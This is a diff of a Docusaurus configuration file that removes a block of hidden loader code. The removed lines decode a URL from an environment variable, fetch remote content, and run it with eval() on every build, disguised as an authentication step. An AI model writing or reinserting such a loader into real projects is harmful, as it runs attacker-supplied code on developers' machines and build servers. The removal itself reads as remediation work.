@@ -3,20 +3,6 @@ import type {Config, Plugin} from '@docusaurus/types';
 import type * as Preset from '@docusaurus/preset-classic';
 import {readdir, readFile, writeFile} from 'fs/promises';
 import {join} from 'path';
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 
 // Inject <meta name="robots" content="noindex,nofollow"> into every HTML file
 // under /docs/internal-ops/. Belt-and-suspenders alongside robots.txt and the
